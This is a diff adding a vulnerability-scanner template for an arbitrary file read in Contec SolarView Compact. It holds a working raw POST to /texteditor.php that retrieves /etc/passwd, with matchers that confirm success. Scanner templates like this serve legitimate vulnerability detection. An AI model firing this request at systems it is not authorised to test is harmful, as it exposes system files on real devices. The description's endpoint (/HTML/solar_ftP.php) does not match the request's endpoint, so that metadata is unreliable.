@@ -1,0 +1,31 @@
+id: contec-solarview-arbitrary-file-read
+info:
+  name: Contec SolarView Compact Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Contec SolarView Compact 6.00 has an arbitrary file read vulnerability due to
+    local file leak vulnerability in /HTML/solar_ftP.php. Exploitation allows
+    attackers to obtain sensitive local files.
+  classification:
+    cve-id: CVE-2022-29302
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: directory-traversal,file-read
+
+http:
+  - raw:
+      - |
+        POST /texteditor.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        directory=%2Fetc%2F&file=passwd&open=%8AJ%82%AD&r_charset=none&newfile=&contents=&w_charset=none&w_delimit=lf&editfile=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<textarea name=\"contents\" cols=\"90\" rows=\"30\">[\\s\\S]{1}root:.*?root:/root:/bin/bash"
